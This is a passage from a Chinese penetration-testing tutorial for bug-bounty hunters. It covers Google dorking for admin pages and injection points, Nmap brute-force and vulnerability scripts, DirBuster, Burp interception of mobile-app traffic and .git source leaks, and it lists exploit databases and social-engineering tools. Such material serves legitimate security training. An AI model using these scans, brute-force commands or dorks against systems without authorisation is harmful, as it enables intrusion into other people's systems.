仔细分析，大胆验证，发散思维，对企业的运维、开发习惯了解绝对是有很大的帮助。可以把漏洞保存下来，进行统计，甚至炫一点可以做成词云展示给自己看，看着看着或者就知道会有什么漏洞。</p><p>wooyun 历史漏洞库：<a href="http://www.anquan.us/">http://www.anquan.us/</a></p><p>漏洞银行：<a href="https://www.bugbank.cn/">https://www.bugbank.cn/</a></p><p>360补天：<a href="https://www.butian.net/">https://www.butian.net/</a></p><p>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p><p><strong>【4】工具信息收集</strong></p><p>如：7kbscan、破壳Web极速扫描器等</p><h2 id="1-4-第四步-指纹识别、Waf、CDN识别"><a href="#1-4-第四步-指纹识别、Waf、CDN识别" class="headerlink" title="1.4 第四步 指纹识别、Waf、CDN识别"></a>1.4 <strong>第四步 指纹识别、Waf、CDN识别</strong></h2><p>​     在这个过程中，可以加入端口扫描、敏感文件扫描之类的操作，工具可自由选择，如：</p><p>御剑WEB指纹识别系统、whatweb、Wapplyzer等工具。</p><p>​    1、在线识纹识别：</p><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps12.jpg" alt="img"> </p><p>2、Waf识别</p><p><a href="https://github.com/EnableSecurity/wafw00f">github.com/EnableSecurity/wafw00f</a></p><p>3、CDN识别</p><p><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py</a></p><h2 id="1-5-第五步-资产梳理"><a href="#1-5-第五步-资产梳理" class="headerlink" title="1.5 第五步 资产梳理"></a>1.5 <strong>第五步 资产梳理</strong></h2><p>​     有了庞大的域名，接下来就是帮助SRC梳理资产了。域名可以先判断存活，活着的继续进行确定IP环节。根据IP的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址：</p><p><strong>SRC众测平台</strong></p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/">https://www.hackerone.com/</a></p><p>BugX区块链漏洞平台 <a href="http://www.bugx.org/">http://www.bugx.org/</a></p><p>Gsrc瓜子src <a href="https://security.guazi.com/">https://security.guazi.com/</a></p><p>区块链安全响应中心 <a href="https://dvpnet.io/">https://dvpnet.io/</a></p><p>CNVD国家信息安全漏洞平台 <a href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a></p><p>漏洞银行：<a href="https://www.bugbank.cn/">https://www.bugbank.cn/</a></p><p>360补天：<a href="https://www.butian.net/">https://www.butian.net/</a></p><p>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p><p><strong>国内平台</strong></p><p>知道创宇Seebug漏洞平台 <a href="https://www.seebug.org/">https://www.seebug.org/</a></p><p>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a></p><p>打造中文最大exploit库 <a href="http://www.expku.com/">http://www.expku.com/</a></p><p>为数不多的漏洞管理插件收集平台 <a href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a></p><p>一家管理漏洞收集的平台 <a href="http://www.0daybank.org/">http://www.0daybank.org/</a></p><p><strong>国外平台</strong></p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/">https://www.hackerone.com/</a></p><p>xss poc  <a href="http://xssor.io/">http://xssor.io/</a></p><p>oday漏洞库 <a href="https://www.0day.today/">https://www.0day.today/</a></p><p>路由器漏洞库 <a href="http://routerpwn.com/">http://routerpwn.com/</a></p><p>cve漏洞平台 <a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p><p><strong>威胁情报</strong></p><p>安全数据交流平台   <a href="https://www.secsilo.com/">https://www.secsilo.com/</a></p><p>华为安全情报 <a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></p><p>威胁情报共享平台  <a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a></p><p>被黑站点统计 <a href="http://www.hacked.com.cn/">http://www.hacked.com.cn/</a></p><p><strong>社工库</strong></p><p>微信伪造  <a href="http://www.jietuyun.com/">http://www.jietuyun.com/</a></p><p>任意邮箱发送  <a href="http://tool.chacuo.net/mailanonymous%E5%92%8Chttps://emkei.cz/">http://tool.chacuo.net/mailanonymous和https://emkei.cz/</a></p><p>临时邮箱 <a href="http://www.yopmail.com/">http://www.yopmail.com/</a></p><p>邮箱池群 <a href="http://veryvp.com/">http://veryvp.com/</a></p><p>社工库 <a href="http://www.uneihan.com/">http://www.uneihan.com/</a></p><h2 id="1-6-G-oogleHack"><a href="#1-6-G-oogleHack" class="headerlink" title="1.6 G**oogleHack**"></a>1.6 <strong>G**</strong>oogleHack**</h2><h3 id="1-6-1-功能介绍"><a href="#1-6-1-功能介绍" class="headerlink" title="1.6.1 功能介绍"></a>1.6.1 <strong>功能介绍</strong></h3><p>​    使用<a href="http://baike.haosou.com/doc/108804.html">Google</a>等搜索引擎对某些特定的<a href="http://baike.haosou.com/doc/3663174.html">网络</a>主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。Google毫无疑问是当今世界上最强大的搜索引擎。然而，在黑客手中，它也是一个秘密武器，它能搜索到一些你意想不到的信息。</p><h3 id="1-6-2-部署-指南"><a href="#1-6-2-部署-指南" class="headerlink" title="1.6.2 部署**指南**"></a>1.6.2 <strong>部署**</strong>指南**</h3><p>a) 一台可以正常访问互联网的设备（通常为PC）</p><p>b) 一个常用浏览器（IE、Chrome等等）</p><p>c) 掌握强大的搜索关键词</p><h3 id="1-6-3-实战"><a href="#1-6-3-实战" class="headerlink" title="1.6.3 实战"></a>1.6.3 <strong>实战</strong></h3><p>​    Google搜索引擎之所以强大，关键在于它详细的搜索关键词，以下是几个常用的搜索关键词：（更多详细教程，参见<a href="http://user.qzone.qq.com/568311803/main%EF%BC%89">http://user.qzone.qq.com/568311803/main）</a></p><p>​    inurl: 用于搜索网页上包含的URL. 这个语法对寻找网页上的搜索,帮助之类的很有用. </p><p>intext: 只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字).</p><p>site: 可以限制你搜索范围的域名. </p><p>filetype: 搜索文件的后缀或者扩展名</p><p>intitle: 限制你搜索的网页标题.</p><p>allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用</p><p>link: 可以得到一个所有包含了某个指定URL的页面列表. 例如🔗<a href="http://www.google.com/">www.google.com</a> 就可以得到所有连接到Google的页面。</p><p><strong>一般常见用法有：</strong></p><p><strong>site</strong>:ooxx.com <strong>filetype</strong>:xls</p><p><strong>site**</strong>:xxx.xxx** <strong>admin</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>login</strong> </p><p><strong>site**</strong>:xxx.xxx** <strong>system</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>管理</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>登录</strong> </p><p><strong>site**</strong>:xxx.xxx** <strong>内部</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>系统</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>邮件</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>email</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>qq</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>群</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>企鹅</strong></p><p><strong>site**</strong>:xxx.xxx** <strong>腾讯</strong></p><p><strong>site:ooxx.com</strong></p><p> <strong>inurl:jmx-console</strong></p><p>实例：</p><ol><li><strong>intext:管理</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps13.jpg" alt="img"> </p><ol start="2"><li><strong>filetype:mdb</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps14.jpg" alt="img"> </p><ol start="3"><li><strong>inurl:file</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps15.jpg" alt="img"> </p><ol start="4"><li><strong>site: baidu.com filetype:txt 查找TXT文件 其他的依次**</strong>类**<strong>推</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps16.jpg" alt="img"> </p><ol start="5"><li><strong>site:baidu.com intext:管理</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps17.jpg" alt="img"> </p><ol start="6"><li><strong>site:baidu.com inurl:login</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps18.jpg" alt="img"> </p><ol start="7"><li><strong>site:baidu.com intitle:后台</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps19.jpg" alt="img"> </p><p>查看服务器使用的程序</p><ol start="8"><li><strong>site:baidu.com filetype:asp</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps20.jpg" alt="img"> </p><ol start="9"><li><strong>site:baidu.com filetype:php</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps21.jpg" alt="img"> </p><ol start="10"><li><strong>site:baidu.com filetype:jsp</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps22.jpg" alt="img"> </p><p>查看上传漏洞：</p><ol start="11"><li><strong>site:baidu**</strong>.com** <strong>inurl:file</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps23.jpg" alt="img"> </p><ol start="12"><li><strong>site: baidu**</strong>.com** <strong>inurl:load</strong></li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps24.jpg" alt="img"> </p><p>查找注射点：</p><ol start="13"><li><strong>site:tw inurl:asp?id=</strong>    这个是找台湾的</li></ol><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps25.jpg" alt="img"> </p><h3 id="1-6-4-Google的优劣势"><a href="#1-6-4-Google的优劣势" class="headerlink" title="1.6.4 Google的优劣势"></a>1.6.4 <strong>Google的优劣势</strong></h3><p>​    优势：</p><p>l 只需一台可以访问Google的联网设备，部署简单；</p><p>l 检索资源库丰富；</p><p>劣势：</p><p>l 搜索关键词多，记忆复杂；</p><p>l GoogleHack需要借助浏览器，属于在线工具，离线不能使用；</p><p>l 国内访问Google需借助VPN等相关手段，增加了上网成本</p><h2 id="1-7-Nmap"><a href="#1-7-Nmap" class="headerlink" title="1.7 Nmap"></a>1.7 <strong>Nmap</strong></h2><p><a href="http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html">http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html</a>  功能介绍</p><p><a href="http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html">http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html</a> 10种扫描方式解释</p><p>​    由于是在win7上面使用，所以要使用兼容win7的winpcap驱动，这里我们使用最新版4.1.2版</p><p>winpcap4.1.2下载地址：<a href="http://www.onlinedown.net/soft/2685.htm">http://www.onlinedown.net/soft/2685.htm</a></p><h3 id="1-7-1-功能-介绍"><a href="#1-7-1-功能-介绍" class="headerlink" title="1.7.1 功能**介绍**"></a>1.7.1 <strong>功能**</strong>介绍**</h3><p>Nmap是一个网络连接端口扫描<a href="http://baike.baidu.com/view/37.htm">软件</a>，用来扫描网上电脑开放的网络连接端口。确定哪些<a href="http://baike.baidu.com/view/133203.htm">服务</a>运行在哪些连接端口，并且推断计算机运行哪个<a href="http://baike.baidu.com/view/880.htm">操作系统</a>。它是网络管理员必用的<a href="http://baike.baidu.com/view/37.htm">软件</a>之一，以及用以评估网络系统安全。</p><p>功能架构图：</p><h3 id="1-2-2-部署指南"><a href="#1-2-2-部署指南" class="headerlink" title="1.2.2 部署指南"></a>1.2.2 <strong>部署指南</strong></h3><p>两种部署方式：</p><p>l Kail集成环境</p><p>l 单独安装（使用yum工具直接安装就可以）</p><h3 id="1-2-3-实战"><a href="#1-2-3-实战" class="headerlink" title="1.2.3 实战"></a>1.2.3 <strong>实战</strong></h3><p>Nmap的参数和选项繁多，功能非常丰富。我们先来看一下Nmap的通用命令格式：（详细教程及下载方式参见：<a href="http://nmap.org/%EF%BC%89">http://nmap.org/）</a></p><p><strong>Nmap**</strong>&lt;扫描选项&gt;&lt;扫描****目标****&gt;**</p><p>(一) <strong>主机发现</strong></p><h4 id="1-主机发现原理"><a href="#1-主机发现原理" class="headerlink" title="1) 主机发现原理"></a>1) <strong>主机发现原理</strong></h4><p>主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCPSYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。</p><h4 id="2-主机发现-的基本用法"><a href="#2-主机发现-的基本用法" class="headerlink" title="2) 主机发现**的基本用法**"></a>2) <strong>主机发现**</strong>的基本用法**</h4><p>l -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 </p><p>l -sn: Ping Scan 只进行主机发现，不进行端口扫描。 </p><p>l -Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。 </p><p>l -PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。 </p><p>l -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p><p>l -PO[protocollist]: 使用IP协议包探测对方主机是否开启。</p><p>l  -n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。 </p><p>l –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS服务器。 </p><p>l –system-dns: 指定使用系统的DNS服务器 </p><p>l –traceroute: 追踪每个路由节点 </p><h4 id="3-使用-演示"><a href="#3-使用-演示" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>扫描局域网10.1.1.1-10.1.1.100范围内哪些IP的主机是活动的。</p><p>​    命令如下：nmap –sn 10.1.1.1-100</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps26.jpg" alt="img"> </p><p>由图可知：10.1.1.2、10.1.1.100两台主机处于存活状态。</p><p>(二) <strong>端口**</strong>扫描**</p><h4 id="1-端口-扫描原理"><a href="#1-端口-扫描原理" class="headerlink" title="1) 端口**扫描原理**"></a>1) <strong>端口**</strong>扫描原理**</h4><p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。Nmap通过探测将端口划分为6个状态：<br>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。</p><p>端口扫描方面非常强大，提供了很多的探测方式：</p><p>l TCP SYN scanning</p><p>l TCP connect scanning</p><p>l TCP ACK scanning</p><p>l TCP FIN/Xmas/NULL scanning</p><p>l UDP scanning</p><p>l 其他方式</p><h4 id="2-端口-扫描用法"><a href="#2-端口-扫描用法" class="headerlink" title="2) 端口**扫描用法**"></a>2) <strong>端口**</strong>扫描用法**</h4><p>l -sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。 </p><p>l -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。 </p><p>l -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。 </p><p>l –scanflags <flags>: 定制TCP包的flags。 </p><p>l -sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</p><p>l -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。 </p><p>l -sO: 使用IP protocol 扫描确定目标机支持的协议类型。</p><p>l -b <FTP relay host>: 使用FTP bounce scan扫描方式 </p><h4 id="3-使用-演示-1"><a href="#3-使用-演示-1" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>在此，我们以主机10.1.1.100为例。命令如下：nmap -sS -sU -T4 -top-ports 300 1.1.1.100</p><p>参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps27.jpg" alt="img"> </p><p>(三) <strong>版本**</strong>侦测**</p><h4 id="1-版本-侦测原理"><a href="#1-版本-侦测原理" class="headerlink" title="1) 版本**侦测原理**"></a>1) <strong>版本**</strong>侦测原理**</h4><p>简要的介绍版本的侦测原理。版本侦测主要分为以下几个步骤：</p><p>l 首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p><p>l 如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。</p><p>l 如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</p><p>l 如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p><p>l 如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p><p>l 如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。</p><h4 id="2-版本-侦测用法"><a href="#2-版本-侦测用法" class="headerlink" title="2) 版本**侦测用法**"></a>2) <strong>版本**</strong>侦测用法**</h4><p>l -sV: 指定让Nmap进行版本侦测 </p><p>l –version-intensity <level>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。 </p><p>l –version-light: 指定使用轻量侦测方式 (intensity 2) </p><p>l –version-all: 尝试使用所有的probes进行侦测 (intensity 9) </p><p>l –version-trace: 显示出详细的版本侦测过程信息。 </p><h4 id="3-使用-演示-2"><a href="#3-使用-演示-2" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>对主机10.1.1.100进行版本侦测。</p><p>命令如下：nmap –sV 10.1.1.100</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps28.jpg" alt="img"> </p><p>(四) <strong>OS侦测</strong></p><h4 id="1-OS-侦测原理"><a href="#1-OS-侦测原理" class="headerlink" title="1) OS**侦测原理**"></a>1) <strong>OS**</strong>侦测原理**</h4><p>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。<br>具体实现方式如下：<br>Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p><h4 id="2-OS-侦测用法"><a href="#2-OS-侦测用法" class="headerlink" title="2) OS**侦测用法**"></a>2) <strong>OS**</strong>侦测用法**</h4><p>l -O: 指定Nmap进行OS侦测。 </p><p>l –osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。 </p><p>l –osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。 </p><h4 id="3-使用-演示-3"><a href="#3-使用-演示-3" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>命令：nmap –O 10.1.1.100</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps29.jpg" alt="img"> </p><p>(五) <strong>漏洞扫描</strong></p><p><strong>扫描端口并且标记可以爆破的服务</strong></p><p><strong>nmap</strong> 目标 –script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</p><p><strong>判断常见的漏洞并扫描端口</strong></p><p><strong>nmap</strong> 目标 –script=auth,vuln</p><p><strong>精确判断漏洞并扫描端口</strong></p><p><strong>nmap</strong> 目标 –script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</p><h3 id="1-2-4-Nmap-的优劣势"><a href="#1-2-4-Nmap-的优劣势" class="headerlink" title="1.2.4 Nmap**的优劣势**"></a>1.2.4 <strong>Nmap**</strong>的优劣势**</h3><p>优势：</p><p>l 功能灵活强大，支持多种目标，大量计算机的同时扫描；</p><p>l 开源，相关帮助文档十分详细；</p><p>l 流行，由于其具有强大的扫描机探测功能，，已被成千上万安全专家使用。</p><p>劣势：</p><p>l Nmap参数众多，难以一一记忆；</p><h2 id="1-8-DirB-uster"><a href="#1-8-DirB-uster" class="headerlink" title="1.8 DirB**uster**"></a>1.8 <strong>DirB**</strong>uster**</h2><h3 id="1-8-1-功能-介绍"><a href="#1-8-1-功能-介绍" class="headerlink" title="1.8.1 功能**介绍**"></a>1.8.1 <strong>功能**</strong>介绍**</h3><p>DirBuster是一款路径及网页暴力破解的工具,可以破解出一直没有访问过或者管理员后台的界面路径。</p><h3 id="1-8-2-部署-指南"><a href="#1-8-2-部署-指南" class="headerlink" title="1.8.2 部署**指南**"></a>1.8.2 <strong>部署**</strong>指南**</h3><p>Java运行环境+DirBuster程序包</p><h3 id="1-8-3-实战"><a href="#1-8-3-实战" class="headerlink" title="1.8.3 实战"></a>1.8.3 <strong>实战</strong></h3><p>详细教程，参见：</p><p><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project</a></p><p><a href="http://sourceforge.net/projects/dirbuster/">http://sourceforge.net/projects/dirbuster/</a></p><p>l 双击运行DirBuster.jar</p><p>l 在URL中输入目标URL或者主机IP地址</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps30.jpg" alt="img"> </p><p>l 在file with list of dirs/files 栏后点击browse，选择破解的字典库为directory-list-2.3-small.txt</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps31.jpg" alt="img"> </p><p>l 将File extension中填入正确的文件后缀，默认为php，如果为jsp页面，需要填入jsp</p><p>l 其他选项不变，点击右下角的start，启动目录查找</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps32.jpg" alt="img"> </p><p>l 观察返回结果，可点击右下角的report，生成目录报告</p><h3 id="1-8-4-DirBuster-优缺点"><a href="#1-8-4-DirBuster-优缺点" class="headerlink" title="1.8.4 DirBuster**优缺点**"></a>1.8.4 <strong>DirBuster**</strong>优缺点**</h3><p>优点：</p><p>l 敏感目录发掘能力强</p><p>l OWASP安全机构极力推荐</p><p>缺点：</p><p>l 程序运行线程小</p><p>l 探测目录依赖字典文件</p><h2 id="1-9-指纹识别"><a href="#1-9-指纹识别" class="headerlink" title="1.9 指纹识别"></a>1.9 <strong>指纹识别</strong></h2><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps33.png" alt="img"></p><h2 id="1-10-扩展：Burp-APP抓包"><a href="#1-10-扩展：Burp-APP抓包" class="headerlink" title="1.10 扩展：Burp APP抓包"></a>1.10 <strong>扩展：Burp APP抓包</strong></h2><p><strong>一、**</strong>手机端配置**</p><p>**1.**让安卓手机和电脑连入同一个WIFI，即是在同一个无线局域网环境下。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps34.jpg" alt="img"> </p><p>**2.**查看电脑的本地IP地址，命令行下输入ipconfig。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps35.jpg" alt="img"> </p><p>无线局域网的IP地址<br>**3.**设置手机代理IP，我这里以oppo系统为例。</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps36.jpg" alt="img"> </p><p>代理设置为“手动”，设置主机名为电脑无线局域网IP地址，端口可以随便设置，其他的设置可以默认。</p><p><strong>二、**</strong>电脑端配置**</p><p>**1.**打开Burpsuite，设置Burp suite代理服务器，点击“Proxy”然后“Options”</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps37.jpg" alt="img"> </p><p>点击“add”添加和手机一样的IP地址和端口，要跟手机上设置的那个端口一致。记得勾上前面的括号。<br>**2.**设置好了后，在“Proxy”：〉“Intercept”下开启“Intercept is on”就可以对安卓APP的网络数据进行抓包了。</p><p><strong>三、证书安装</strong></p><p>​    <strong>抓取HTTPS包需要导入Burp的证书。**</strong>特别注意：一个Burp对应一个证书，就是用哪个Burp抓包就导出哪个的证书，并将该证书在手机上安装。非常重要，因为以前抓包安过证书但是用的不是同一个Burp导致抓包失败，浪费了很多时间。**</p><p><strong>导出Burp证书步骤为： Proxy—Options—-import\export CA</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps38.jpg" alt="img"> </p><p><strong>选择第一个，然后next</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps39.jpg" alt="img"> </p><p><strong>选择保存的CA路径，**</strong>文件后缀命名为.cer，非常重要，因为手机只能安装.cer的证书类型，默认的der格式是不能被识别安装的。**</p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps40.jpg" alt="img"> </p><p><strong>将证书发送到手机，我是直接微信发送的，然后在微信中下载，并记住下载的目录。</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps41.jpg" alt="img"> </p><p><strong>找到下载的目录，将证书文件复制到手机存储的**</strong>根目录**<strong>。</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps42.jpg" alt="img"> </p><p><strong>打开手机设置–其它设置–安全和隐私–更多安全设置–从SD卡安装</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps43.jpg" alt="img"> </p><p><strong>到根目录下，找到.cer文件，安装.cer证书，重命名个名字</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps44.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps45.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps46.jpg" alt="img"> </p><p><strong>成功安装后，可以在手机—-设置—-安全和隐私—-更多安全设置—-受信任的凭据—-用户—-看到PortSwigger文件。</strong></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps47.jpg" alt="img"> </p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps48.jpg" alt="img"> </p><p><strong>至此，安装完成。全部工作完成，可以打开burp，准备抓包了。</strong></p><h2 id="1-11-扩展-常见信息泄露利用方法"><a href="#1-11-扩展-常见信息泄露利用方法" class="headerlink" title="1.11 扩展:常见信息泄露利用方法"></a>1.11 <strong>扩展:常见信息泄露利用方法</strong></h2><p><strong>一、Git导致文件泄露</strong></p><p>​    由于目前的 web 项目的开发采用前后端完全分离的架构:前端全部使用静态文件，和后端代码完全分离，隶属两个不同的项目。表态文件使用 git 来进行同步发布到服务器，然后使用nginx 指向到指定目录，以达到被公网访问的目的。<br>    在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps49.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps50.jpg" alt="img"></p><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps51.jpg" alt="img"><br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps52.png" 